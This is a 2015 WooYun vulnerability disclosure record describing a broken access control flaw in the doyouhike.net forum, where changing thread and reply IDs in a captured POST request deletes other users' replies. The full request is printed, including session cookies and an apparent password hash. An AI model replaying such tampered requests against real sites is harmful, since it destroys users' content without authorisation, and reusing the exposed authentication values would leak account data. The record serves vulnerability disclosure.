{"id": 76171, "wybug_id": "wooyun-2015-0165520", "wybug_title": "磨房网某处越权漏洞", "wybug_corp": "doyouhike.net", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-12-28 22:46", "wybug_open_date": "2016-02-09 23:29", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-09：\t细节向公众公开  简要描述： 求磨小驴 详细说明：  此处越权是出现在 论坛 模块的回复处，可越权删除别人的回复最终测试结果为 无需回复 即可删除 别人的帖子我们先一步步来证明首先第一步 我们进论坛 随便打开一个非本账户发布的帖子（前提是必须有别人的回复，也就是最起码有2楼）：随便选了一个 http://www.doyouhike.net/forum/globe/2334245,0,0,0.html\n\n1楼是不可能删掉的 因为是主贴 下面我来演示如何删除2 楼 3楼首先 我们在底下随便回复一些内容\n\n我们可以看见自己发的回复有删除功能 我们点击删除然后在 确定删除那 我们抓包：\n\n完整的数据包（图）：\n\n完整的数据包（数据）：\nPOST /forum/topic_delete/index HTTP/1.1Host: www.doyouhike.netContent-Length: 101Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.doyouhike.netUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 UBrowser/5.5.7852.203 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.doyouhike.net/forum/topic_delete?mod=forum&tid=2334245&pos=globe%2F&url=%2Fforum%2Fglobe%2F2334245%2C0%2C0%2C1.html&pid=94819399Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=c0e63fjr3t4u11ttttu83q9rb6; dyh_userid=1279988; dyh_password=bdaff82202767ff40ceff407874ce5bd; IESESSION=alive; pgv_pvi=8593548288; pgv_si=s6529086464; __utmt=1; dyh_lastactivity=1451299184; __utma=151782572.1166654032.1451292000.1451292000.1451292000.1; __utmb=151782572.123.10.1451292000; __utmc=151782572; __utmz=151782572.1451292000.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)memo=&mod=forum&pos=globe%2F&url=%2Fforum%2Fglobe%2F2334245%2C0%2C0%2C1.html&tid=2334245&pid=94819399\n我们可以看见post的最后两个参数 一个 tid 一个pid (tid指的是帖子的编号  pid 则是回复楼层的编号)tid 好获得 打开帖子的url 里就是 tid 那么我们怎么得到 2 楼 3楼 甚至其他的帖子的pid呢？我们回到帖子的主页 右键点击所要删除楼层的 引用 点击 审查元素\n\n\n\n这里我们得到 2楼的pid 为 94796427我们修改刚刚的数据 并发送\n\n然后 我们刷新刚刚的帖子：http://www.doyouhike.net/forum/globe/2334245,0,0,0.html\n\n2楼已经没有了  这里3楼 我就不删除了 经过几次尝试  只要把要删除的楼层编号 以及 帖子编号记住 然后按照刚刚的数据 进行 post 传送 就可任意删除所有帖子的回复楼层   漏洞证明：     修复方案：  编辑楼层那 控制的很好  删除那不应该出现这种低级逻辑错误PS：很喜欢磨小驴 多送几个呗   版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-12-29 08:19 厂商回复： 低级的逻辑错误但影响较大，足以对整个社区的内容造成破坏 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}